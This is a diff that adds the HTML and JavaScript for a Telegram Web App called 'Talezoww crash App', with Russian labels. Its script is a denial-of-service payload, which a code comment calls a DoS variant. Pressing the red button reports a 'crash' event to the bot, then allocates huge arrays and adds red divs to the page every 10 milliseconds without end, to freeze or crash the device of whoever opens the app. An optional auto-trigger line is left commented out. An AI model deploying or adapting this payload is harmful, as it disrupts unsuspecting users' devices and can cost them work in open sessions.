@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: var(--tg-theme-bg-color);
+            color: var(--tg-theme-text-color);
+            font-family: system-ui;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: var(--tg-theme-button-color);
+            color: var(--tg-theme-button-text-color);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .danger {
+            background: #dc3545;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Talezoww crash App</h1>
+        <button id="crashBtn" class="danger">⚠️ ЗАПУСТИТЬ ПРОЦЕСС ⚠️</button>
+        <button id="closeBtn">Закрыть</button>
+    </div>
+    
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand(); // На весь экран
+        
+        // Функция для нагрузки (вариант DoS)
+        function triggerPayload() {
+            // Массивная аллокация памяти
+            let arr = [];
+            for (let i = 0; i < 100; i++) {
+                arr.push(new Array(10000000).fill('X'));
+            }
+            // Бесконечный рендеринг
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    let div = document.createElement('div');
+                    div.style.position = 'fixed';
+                    div.style.top = Math.random() * 10000 + 'px';
+                    div.style.left = Math.random() * 10000 + 'px';
+                    div.style.width = '100px';
+                    div.style.height = '100px';
+                    div.style.background = 'red';
+                    document.body.appendChild(div);
+                }
+            }, 10);
+        }
+        
+        document.getElementById('crashBtn').onclick = () => {
+            tg.sendData(JSON.stringify({ action: 'crash', time: Date.now() }));
+            triggerPayload();
+        };
+        
+        document.getElementById('closeBtn').onclick = () => {
+            tg.close();
+        };
+        
+        // Автоматический триггер (если нужно)
+        // triggerPayload();
+    </script>
+</body>
+</html>
